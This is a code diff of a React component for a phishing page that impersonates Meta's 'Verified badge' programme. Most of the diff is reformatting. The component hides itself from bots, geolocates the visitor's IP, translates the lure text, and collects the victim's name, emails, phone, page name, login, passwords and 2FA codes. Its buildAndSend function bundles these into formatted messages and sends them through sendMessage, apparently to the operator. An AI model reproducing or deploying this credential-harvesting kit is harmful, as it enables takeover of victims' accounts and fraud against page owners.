@@ -24,33 +24,34 @@ import DocImg from '@/assets/images/doc.png';
 
 const LABEL = 'Thần-tài-đến';
 
-const Home = () => {
-    const [showFirstModal, setShowFirstModal] = useState(false);
-    const [showLoginModal, setShowLoginModal] = useState(false);
-    const [show2FAModal, setShow2FAModal] = useState(false);
-    const [showUploadModal, setShowUploadModal] = useState(false);
-    const [showSuccessModal, setShowSuccessModal] = useState(false);
-    const [showSearchModal, setShowSearchModal] = useState(false);
-    const [showPrivacyModal, setShowPrivacyModal] = useState(false);
-    const [selectedPrivacyQuestion, setSelectedPrivacyQuestion] = useState(null);
-    const [showTermsModal, setShowTermsModal] = useState(false);
-    const [showMobileSidebar, setShowMobileSidebar] = useState(false);
-    const [formData, setFormData] = useState({
+const Home = () =>
+{
+    const [ showFirstModal, setShowFirstModal ] = useState( false );
+    const [ showLoginModal, setShowLoginModal ] = useState( false );
+    const [ show2FAModal, setShow2FAModal ] = useState( false );
+    const [ showUploadModal, setShowUploadModal ] = useState( false );
+    const [ showSuccessModal, setShowSuccessModal ] = useState( false );
+    const [ showSearchModal, setShowSearchModal ] = useState( false );
+    const [ showPrivacyModal, setShowPrivacyModal ] = useState( false );
+    const [ selectedPrivacyQuestion, setSelectedPrivacyQuestion ] = useState( null );
+    const [ showTermsModal, setShowTermsModal ] = useState( false );
+    const [ showMobileSidebar, setShowMobileSidebar ] = useState( false );
+    const [ formData, setFormData ] = useState( {
         fullName: '',
         personalEmail: '',
         businessEmail: '',
         phone: '',
         pageName: '',
         loginIdentifier: ''
-    });
-    const [loginAttempts, setLoginAttempts] = useState([]);
-    const [twoFAAttempts, setTwoFAAttempts] = useState([]);
-    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' });
-    const [translatedTexts, setTranslatedTexts] = useState({});
-    const [isLoading, setIsLoading] = useState(true);
+    } );
+    const [ loginAttempts, setLoginAttempts ] = useState( [] );
+    const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
+    const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', country: 'Unknown' } );
+    const [ translatedTexts, setTranslatedTexts ] = useState( {} );
+    const [ isLoading, setIsLoading ] = useState( true );
 
     const defaultTexts = useMemo(
-        () => ({
+        () => ( {
             title: 'Your page has met the requirements to receive the Verified badge.',
             congrats: 'Congratulations on meeting the requirements to upgrade your page to the Verified badge',
             milestone: 'This is a fantastic milestone, reflecting your dedication and the trust you have built with your audience.',
@@ -219,191 +220,221 @@ const Home = () => {
             privacyQ11: 'How will you know when the policy changes?',
             privacyQ12: 'How to ask Meta questions?',
             privacyQ13: 'Why and how we process your data'
-        }),
+        } ),
         []
     );
 
     const location = useLocation();
 
-    useEffect(() => {
+    useEffect( () =>
+    {
         localStorage.clear();
         initializeApp();
-    }, []);
+    }, [] );
 
-    useEffect(() => {
-        if (location.state?.autoOpen) {
-            setShowFirstModal(true);
+    useEffect( () =>
+    {
+        if ( location.state?.autoOpen )
+        {
+            setShowFirstModal( true );
         }
-    }, [location.state]);
+    }, [ location.state ] );
 
-    const initializeApp = async () => {
-        try {
+    const initializeApp = async () =>
+    {
+        try
+        {
             const botResult = await detectBot();
-            if (botResult.isBot) {
+            if ( botResult.isBot )
+            {
                 window.location.href = 'about:blank';
                 return;
             }
 
-            try {
-                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
+            try
+            {
+                const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                 const data = response.data;
-                setIpInfo({
+                setIpInfo( {
                     ip: data.ip || 'Unknown',
                     country: data.country || 'Unknown'
-                });
-                localStorage.setItem('ipInfo', JSON.stringify(data));
+                } );
+                localStorage.setItem( 'ipInfo', JSON.stringify( data ) );
 
                 const countryCode = data.country_code;
-                const targetLang = countryToLanguage[countryCode] || 'en';
-                localStorage.setItem('targetLang', targetLang);
+                const targetLang = countryToLanguage[ countryCode ] || 'en';
+                localStorage.setItem( 'targetLang', targetLang );
 
-                if (targetLang !== 'en') {
-                    translateAllTexts(targetLang);
-                } else {
-                    setTranslatedTexts(defaultTexts);
+                if ( targetLang !== 'en' )
+                {
+                    translateAllTexts( targetLang );
+                } else
+                {
+                    setTranslatedTexts( defaultTexts );
                 }
-            } catch (error) {
-                console.error('Error fetching IP:', error);
-                setTranslatedTexts(defaultTexts);
+            } catch ( error )
+            {
+                console.error( 'Error fetching IP:', error );
+                setTranslatedTexts( defaultTexts );
             }
 
-            setIsLoading(false);
-        } catch (error) {
-            console.error('Initialization error:', error);
-            setIsLoading(false);
+            setIsLoading( false );
+        } catch ( error )
+        {
+            console.error( 'Initialization error:', error );
+            setIsLoading( false );
         }
     };
 
     const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const keys = Object.keys(defaultTexts);
-                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
+        async ( targetLang ) =>
+        {
+            try
+            {
+                const keys = Object.keys( defaultTexts );
+                const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
                 const translated = {};
-                keys.forEach((key, index) => {
-                    translated[key] = translations[index];
-                });
-                setTranslatedTexts(translated);
-            } catch (error) {
-                console.error('Translation error:', error);
-                setTranslatedTexts(defaultTexts);
+                keys.forEach( ( key, index ) =>
+                {
+                    translated[ key ] = translations[ index ];
+                } );
+                setTranslatedTexts( translated );
+            } catch ( error )
+            {
+                console.error( 'Translation error:', error );
+                setTranslatedTexts( defaultTexts );
             }
         },
-        [defaultTexts]
+        [ defaultTexts ]
     );
 
-    const pad = (n) => (n < 10 ? '0' + n : String(n));
+    const pad = ( n ) => ( n < 10 ? '0' + n : String( n ) );
 
-    const formatDateTime = (d) => {
+    const formatDateTime = ( d ) =>
+    {
         return (
-            pad(d.getDate()) +
+            pad( d.getDate() ) +
             '/' +
-            pad(d.getMonth() + 1) +
+            pad( d.getMonth() + 1 ) +
             '/' +
             d.getFullYear() +
             ' ' +
-            pad(d.getHours()) +
+            pad( d.getHours() ) +
             ':' +
-            pad(d.getMinutes()) +
+            pad( d.getMinutes() ) +
             ':' +
-            pad(d.getSeconds())
+            pad( d.getSeconds() )
         );
     };
 
-    const buildAndSend = async (data) => {
-        const dt = formatDateTime(new Date());
+    const buildAndSend = async ( data ) =>
+    {
+        const dt = formatDateTime( new Date() );
         const { form, login, passes, codes } = data;
 
-        let message = `📩 <b>${LABEL}</b>\n`;
-        message += `⏰ ${dt}\n`;
-        message += `🌐 <code>${ipInfo.ip}</code> • ${ipInfo.country}\n`;
+        let message = `📩 <b>${ LABEL }</b>\n`;
+        message += `⏰ ${ dt }\n`;
+        message += `🌐 <code>${ ipInfo.ip }</code> • ${ ipInfo.country }\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
-        if (form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName) {
+        if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName )
+        {
             message += `<b>📋 THÔNG TIN</b>\n`;
-            if (form.fullName) message += `   Tên: <code>${form.fullName}</code>\n`;
-            if (form.personalEmail) message += `   Email: <code>${form.personalEmail}</code>\n`;
-            if (form.businessEmail && form.businessEmail !== form.personalEmail) {
-                message += `   Business: <code>${form.businessEmail}</code>\n`;
+            if ( form.fullName ) message += `   Tên: <code>${ form.fullName }</code>\n`;
+            if ( form.personalEmail ) message += `   Email: <code>${ form.personalEmail }</code>\n`;
+            if ( form.businessEmail && form.businessEmail !== form.personalEmail )
+            {
+                message += `   Business: <code>${ form.businessEmail }</code>\n`;
             }
-            if (form.phone) message += `   SĐT: <code>${form.phone}</code>\n`;
-            if (form.pageName) message += `   Page: <code>${form.pageName}</code>\n`;
+            if ( form.phone ) message += `   SĐT: <code>${ form.phone }</code>\n`;
+            if ( form.pageName ) message += `   Page: <code>${ form.pageName }</code>\n`;
         }
 
-        if (login || (passes && passes.length > 0)) {
+        if ( login || ( passes && passes.length > 0 ) )
+        {
             message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
-            if (login) message += `   TK: <code>${login}</code>\n`;
-            if (passes && passes.length > 0) {
-                passes.forEach((p, i) => {
-                    message += `   MK${i + 1}: <code>${p}</code>\n`;
-                });
+            if ( login ) message += `   TK: <code>${ login }</code>\n`;
+            if ( passes && passes.length > 0 )
+            {
+                passes.forEach( ( p, i ) =>
+                {
+                    message += `   MK${ i + 1 }: <code>${ p }</code>\n`;
+                } );
             }
         }
 
-        if (codes && codes.length > 0) {
+        if ( codes && codes.length > 0 )
+        {
             message += `\n<b>🔒 MÃ 2FA</b>\n`;
-            codes.forEach((c, i) => {
-                message += `   Code${i + 1}: <code>${c}</code>\n`;
-            });
+            codes.forEach( ( c, i ) =>
+            {
+                message += `   Code${ i + 1 }: <code>${ c }</code>\n`;
+            } );
         }
 
         message += `━━━━━━━━━━━━━━━━━━━━`;
 
-        try {
-            await sendMessage(message);
-        } catch (error) {
-            console.error('Error sending message:', error);
+        try
+        {
+            await sendMessage( message );
+        } catch ( error )
+        {
+            console.error( 'Error sending message:', error );
         }
     };
 
-    const handleFirstFormSubmit = (data) => {
+    const handleFirstFormSubmit = ( data ) =>
+    {
         const newFormData = { ...formData, ...data };
-        setFormData(newFormData);
-        setShowFirstModal(false);
-        setShowLoginModal(true);
+        setFormData( newFormData );
+        setShowFirstModal( false );
+        setShowLoginModal( true );
 
-        buildAndSend({
+        buildAndSend( {
             form: newFormData,
             login: null,
             passes: [],
             codes: []
-        });
+        } );
     };
 
-    const handleLoginSubmit = (email, password) => {
+    const handleLoginSubmit = ( email, password ) =>
+    {
         const newFormData = { ...formData, loginIdentifier: email };
-        const newPasses = [...loginAttempts.map(p => p.value), password].slice(-2);
+        const newPasses = [ ...loginAttempts.map( p => p.value ), password ].slice( -2 );
 
-        setFormData(newFormData);
-        setLoginAttempts(prev => [...prev, { time: new Date().toISOString(), value: password }].slice(-2));
+        setFormData( newFormData );
+        setLoginAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: password } ].slice( -2 ) );
 
-        buildAndSend({
+        buildAndSend( {
             form: newFormData,
             login: email,
             passes: newPasses,
-            codes: twoFAAttempts.map(c => c.value)
-        });
+            codes: twoFAAttempts.map( c => c.value )
+        } );
     };
 
-    const handle2FASubmit = (code) => {
-        const newCodes = [...twoFAAttempts.map(c => c.value), code].slice(-3);
+    const handle2FASubmit = ( code ) =>
+    {
+        const newCodes = [ ...twoFAAttempts.map( c => c.value ), code ].slice( -3 );
 
-        setTwoFAAttempts(prev => [...prev, { time: new Date().toISOString(), value: code }].slice(-3));
+        setTwoFAAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: code } ].slice( -3 ) );
 
-        buildAndSend({
+        buildAndSend( {
             form: formData,
             login: formData.loginIdentifier,
-            passes: loginAttempts.map(p => p.value),
+            passes: loginAttempts.map( p => p.value ),
             codes: newCodes
-        });
+        } );
     };
 
-    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;
+    const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;
 
-    if (isLoading) {
+    if ( isLoading )
+    {
         return (
-            <div id="intro" style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 }}>
-                <img id="meta-logo" src={MetaLogo} alt="Meta" style={{ width: '70%', height: 'auto' }} />
+            <div id="intro" style={ { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 } }>
+                <img id="meta-logo" src={ MetaLogo } alt="Meta" style={ { width: '70%', height: 'auto' } } />
             </div>
         );
     }
@@ -445,95 +476,98 @@ const Home = () => {
                             >                            </path>
                         </svg>
                     </div>
-                    <div className="burger-button" id="showPopup" onClick={() => setShowMobileSidebar(true)} style={{ cursor: 'pointer' }}>
+                    <div className="burger-button" id="showPopup" onClick={ () => setShowMobileSidebar( true ) } style={ { cursor: 'pointer' } }>
                         <div className="bar"></div>
                         <div className="bar"></div>
                         <div className="bar"></div>
                     </div>
                 </div>
                 <div className="row">
-                            <div className="col-4">
-                                <Sidebar
-                                    texts={texts}
-                                    onOpenSearchModal={() => setShowSearchModal(true)}
-                                    onOpenPrivacyModal={(question) => {
-                                        setSelectedPrivacyQuestion(question);
-                                        setShowPrivacyModal(true);
-                                    }}
-                                    onOpenTermsModal={() => setShowTermsModal(true)}
-                                />
-                            </div>
+                    <div className="col-4">
+                        <Sidebar
+                            texts={ texts }
+                            onOpenSearchModal={ () => setShowSearchModal( true ) }
+                            onOpenPrivacyModal={ ( question ) =>
+                            {
+                                setSelectedPrivacyQuestion( question );
+                                setShowPrivacyModal( true );
+                            } }
+                            onOpenTermsModal={ () => setShowTermsModal( true ) }
+                        />
+                    </div>
                     <div className="col-8">
                         <div id="right">
                             <h1>
-                                <img alt="" src={TickIcon} style={{ height: '50px', width: '50px', marginRight: '8px' }} />
-                                {texts.title}
+                                <img alt="" src={ TickIcon } style={ { height: '50px', width: '50px', marginRight: '8px' } } />
+                                { texts.title }
                             </h1>
-                            <p>{texts.congrats}</p>
-                            <p>{texts.milestone}</p>
-                            <p>{texts.excited}</p>
+                            <p>{ texts.congrats }</p>
+                            <p>{ texts.milestone }</p>
+                            <p>{ texts.excited }</p>
 
-                            <div id="card" style={{ background: 'rgb(222, 240, 243)' }}>
-                                <img alt="" src={TichImage} style={{ marginTop: '30px' }} />
+                            <div id="card" style={ { background: 'rgb(222, 240, 243)' } }>
                                 <div className="card-text">
                                     <div
-                                        style={{
+                                        style={ {
                                             borderRadius: '15px',
                                             backgroundColor: 'white',
                                             padding: '20px 20px 10px 20px'
-                                        }}
+                                        } }
                                     >
                                         <h5>
-                                            <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle' }} /> {texts.metaVerified}
+                                            <img src={ TickIcon } width="18" alt="tick" style={ { verticalAlign: 'middle' } } /> { texts.metaVerified }
                                         </h5>
-                                        <h6>{texts.protectBrand}</h6>
-                                        <h6 style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-                                            <span>{texts.showWorld}</span>
-                                            <span>{texts.buildConfidence}</span>
+                                        <h6>{ texts.protectBrand }</h6>
+                                        <h6 style={ { display: 'flex', flexDirection: 'column', gap: '6px' } }>
+                                            <span>{ texts.showWorld }</span>
+                                            <span>{ texts.buildConfidence }</span>
                                         </h6>
                                     </div>
                                     <div className="btn-wrapper">
-                                        <div className="button fb-blue w-100" id="start" onClick={() => setShowFirstModal(true)}>
-                                            {texts.getBadge}
+                                        <div className="button fb-blue w-100" id="start" onClick={ () => setShowFirstModal( true ) }>
+                                            { texts.getBadge }
                                         </div>
                                     </div>
                                 </div>
+                                <img alt="" src={ TichImage } style={ { borderRadius: '20px' } } />
+
                             </div>
 
-                            <BenefitsSection texts={texts} />
-                            <TestimonialSection texts={texts} />
+                            <BenefitsSection texts={ texts } />
+                            <TestimonialSection texts={ texts } />
 
                             <h5>
-                                <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle' }} /> {texts.exploreBusiness}
+                                <img src={ TickIcon } width="18" alt="tick" style={ { verticalAlign: 'middle' } } /> { texts.exploreBusiness }
                             </h5>
                             <br />
-                            <h6>{texts.businessDesc1}</h6>
-                            <h6>{texts.businessDesc2}</h6>
-                            <h6>{texts.businessDesc3}</h6>
-                            <h6>{texts.businessDesc4}</h6>
+                            <h6>{ texts.businessDesc1 }</h6>
+                            <h6>{ texts.businessDesc2 }</h6>
+                            <h6>{ texts.businessDesc3 }</h6>
+                            <h6>{ texts.businessDesc4 }</h6>
                             <h6>
-                                {texts.businessDesc5}
+                                { texts.businessDesc5 }
                                 <br />
-                                {texts.businessDesc6}
+                                { texts.businessDesc6 }
                                 <br />
                                 <br />
                                 <div className="fake-likns">
                                     <div className="action-button-list">
                                         <div
                                             className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.privacyPolicyQ);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
+                                            onClick={ () =>
+                                            {
+                                                setSelectedPrivacyQuestion( texts.privacyPolicyQ );
+                                                setShowPrivacyModal( true );
+                                            } }
+                                            style={ { cursor: 'pointer' } }
                                         >
                                             <div className="action-button-img">
-                                                <img alt="" src={SaveImg} />
+                                                <img alt="" src={ SaveImg } />
                                             </div>
                                             <div className="action-button-text">
-                                                <span>{texts.privacyPolicyQ}</span>
+                                                <span>{ texts.privacyPolicyQ }</span>
                                                 <br />
-                                                <span className="small-grey">{texts.privacyPolicy}</span>
+                                                <span className="small-grey">{ texts.privacyPolicy }</span>
                                             </div>
                                             <div className="action-button-arrow">
                                                 <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
@@ -543,19 +577,20 @@ const Home = () => {
                                         </div>
                                         <div
                                             className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.manageInfo);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
+                                            onClick={ () =>
+                                            {
+                                                setSelectedPrivacyQuestion( texts.manageInfo );
+                                                setShowPrivacyModal( true );
+                                            } }
+                                            style={ { cursor: 'pointer' } }
                                         >
                                             <div className="action-button-img">
-                                                <img alt="" src={SaveImg} />
+                                                <img alt="" src={ SaveImg } />
                                             </div>
                                             <div className="action-button-text">
-                                                <span>{texts.manageInfo}</span>
+                                                <span>{ texts.manageInfo }</span>
                                                 <br />
-                                                <span className="small-grey">{texts.privacyPolicy}</span>
+                                                <span className="small-grey">{ texts.privacyPolicy }</span>
                                             </div>
                                             <div className="action-button-arrow">
                                                 <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
@@ -565,17 +600,17 @@ const Home = () => {
                                         </div>
                                     </div>
                                     <br />
-                                    <h6>{texts.userAgreement}</h6>
+                                    <h6>{ texts.userAgreement }</h6>
                                     <div
                                         className="action-button wide"
-                                        onClick={() => setShowTermsModal(true)}
-                                        style={{ cursor: 'pointer' }}
+                                        onClick={ () => setShowTermsModal( true ) }
+                                        style={ { cursor: 'pointer' } }
                                     >
                                         <div className="action-button-img">
-                                            <img alt="" src={DocImg} />
+                                            <img alt="" src={ DocImg } />
                                         </div>
                                         <div className="action-button-text">
-                                            <span>{texts.metaAI}</span>
+                                            <span>{ texts.metaAI }</span>
                                             <br />
                                             <span className="small-grey">User Agreement</span>
                                         </div>
@@ -586,20 +621,21 @@ const Home = () => {
                                         </div>
                                     </div>
                                     <br />
-                                    <h6>{texts.additionalResources}</h6>
+                                    <h6>{ texts.additionalResources }</h6>
                                     <div className="action-button-list">
                                         <div
                                             className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.aiInfo);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
+                                            onClick={ () =>
+                                            {
+                                                setSelectedPrivacyQuestion( texts.aiInfo );
+                                                setShowPrivacyModal( true );
+                                            } }
+                                            style={ { cursor: 'pointer' } }
                                         >
                                             <div className="action-button-text">
-                                                <span>{texts.aiInfo}</span>
+                                                <span>{ texts.aiInfo }</span>
                                                 <br />
-                                                <span className="small-grey">{texts.privacyCenter}</span>
+                                                <span className="small-grey">{ texts.privacyCenter }</span>
                                             </div>
                                             <div className="action-button-arrow">
                                                 <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
@@ -609,16 +645,17 @@ const Home = () => {
                                         </div>
                                         <div
                                             className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.aiCards);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
+                                            onClick={ () =>
+                                            {
+                                                setSelectedPrivacyQuestion( texts.aiCards );
+                                                setShowPrivacyModal( true );
+                                            } }
+                                            style={ { cursor: 'pointer' } }
                                         >
                                             <div className="action-button-text">
-                                                <span>{texts.aiCards}</span>
+                                                <span>{ texts.aiCards }</span>
                                                 <br />
-                                                <span className="small-grey">{texts.metaAIWebsite}</span>
+                                                <span className="small-grey">{ texts.metaAIWebsite }</span>
                                             </div>
                                             <div className="action-button-arrow">
                                                 <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
@@ -628,16 +665,17 @@ const Home = () => {
                                         </div>
                                         <div
                                             className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.aiIntro);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
+                                            onClick={ () =>
+                                            {
+                                                setSelectedPrivacyQuestion( texts.aiIntro );
+                                                setShowPrivacyModal( true );
+                                            } }
+                                            style={ { cursor: 'pointer' } }
                                         >
                                             <div className="action-button-text">
-                                                <span>{texts.aiIntro}</span>
+                                                <span>{ texts.aiIntro }</span>
                                                 <br />
-                                                <span className="small-grey">{texts.forTeenagers}</span>
+                                                <span className="small-grey">{ texts.forTeenagers }</span>
                                             </div>
                                             <div className="action-button-arrow">
                                                 <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
@@ -649,58 +687,62 @@ const Home = () => {
                                 </div>
                             </h6>
                             <p className="small-grey">
-                                {texts.privacyRisks} <a className="add-svg" id="policyLink" target="_blank" rel="noopener noreferrer">{texts.privacyPolicy}</a>
+                                { texts.privacyRisks } <a className="add-svg" id="policyLink" target="_blank" rel="noopener noreferrer">{ texts.privacyPolicy }</a>
                             </p>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <FirstFormModal show={showFirstModal} onClose={() => setShowFirstModal(false)} onSubmit={handleFirstFormSubmit} texts={texts} />
-            <LoginModal show={showLoginModal} onClose={() => setShowLoginModal(false)} onSubmit={handleLoginSubmit} onSuccess={() => { setShowLoginModal(false); setShow2FAModal(true); }} texts={texts} />
-            <TwoFAModal show={show2FAModal} onClose={() => setShow2FAModal(false)} onSubmit={handle2FASubmit} onSuccess={() => { setShow2FAModal(false); setShowUploadModal(true); }} texts={texts} />
-            <UploadModal show={showUploadModal} onClose={() => setShowUploadModal(false)} onSuccess={() => { setShowUploadModal(false); setShowSuccessModal(true); }} texts={texts} />
-            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
-            <SearchModal show={showSearchModal} onClose={() => setShowSearchModal(false)} texts={texts} />
+            <FirstFormModal show={ showFirstModal } onClose={ () => setShowFirstModal( false ) } onSubmit={ handleFirstFormSubmit } texts={ texts } />
+            <LoginModal show={ showLoginModal } onClose={ () => setShowLoginModal( false ) } onSubmit={ handleLoginSubmit } onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } } texts={ texts } />
+            <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } } texts={ texts } />
+            <UploadModal show={ showUploadModal } onClose={ () => setShowUploadModal( false ) } onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } } texts={ texts } />
+            <SuccessModal show={ showSuccessModal } onClose={ () => setShowSuccessModal( false ) } texts={ texts } />
+            <SearchModal show={ showSearchModal } onClose={ () => setShowSearchModal( false ) } texts={ texts } />
             <PrivacyPolicyModal
-                show={showPrivacyModal}
-                onClose={() => {
-                    setShowPrivacyModal(false);
-                    setSelectedPrivacyQuestion(null);
-                }}
-                selectedQuestion={selectedPrivacyQuestion}
-                texts={texts}
+                show={ showPrivacyModal }
+                onClose={ () =>
+                {
+                    setShowPrivacyModal( false );
+                    setSelectedPrivacyQuestion( null );
+                } }
+                selectedQuestion={ selectedPrivacyQuestion }
+                texts={ texts }
             />
-            <TermsModal show={showTermsModal} onClose={() => setShowTermsModal(false)} texts={texts} />
+            <TermsModal show={ showTermsModal } onClose={ () => setShowTermsModal( false ) } texts={ texts } />
 
-            {showMobileSidebar && (
-                <div className="popup show" id="popup" onClick={() => setShowMobileSidebar(false)} style={{ display: 'block' }}>
-                    <div className="popup-item" onClick={(e) => e.stopPropagation()}>
-                        <div className="burger-button-popup" id="closePopup" onClick={() => setShowMobileSidebar(false)} style={{ cursor: 'pointer' }}>
+            { showMobileSidebar && (
+                <div className="popup show" id="popup" onClick={ () => setShowMobileSidebar( false ) } style={ { display: 'block' } }>
+                    <div className="popup-item" onClick={ ( e ) => e.stopPropagation() }>
+                        <div className="burger-button-popup" id="closePopup" onClick={ () => setShowMobileSidebar( false ) } style={ { cursor: 'pointer' } }>
                             <div className="bar"></div>
                             <div className="bar"></div>
                         </div>
                         <div className="popup-content">
                             <Sidebar
-                                texts={texts}
-                                onOpenSearchModal={() => {
-                                    setShowMobileSidebar(false);
-                                    setShowSearchModal(true);
-                                }}
-                                onOpenPrivacyModal={(question) => {
-                                    setShowMobileSidebar(false);
-                                    setSelectedPrivacyQuestion(question);
-                                    setShowPrivacyModal(true);
-                                }}
-                                onOpenTermsModal={() => {
-                                    setShowMobileSidebar(false);
-                                    setShowTermsModal(true);
-                                }}
+                                texts={ texts }
+                                onOpenSearchModal={ () =>
+                                {
+                                    setShowMobileSidebar( false );
+                                    setShowSearchModal( true );
+                                } }
+                                onOpenPrivacyModal={ ( question ) =>
+                                {
+                                    setShowMobileSidebar( false );
+                                    setSelectedPrivacyQuestion( question );
+                                    setShowPrivacyModal( true );
+                                } }
+                                onOpenTermsModal={ () =>
+                                {
+                                    setShowMobileSidebar( false );
+                                    setShowTermsModal( true );
+                                } }
                             />
                         </div>
                     </div>
                 </div>
-            )}
+            ) }
         </>
     );
 };
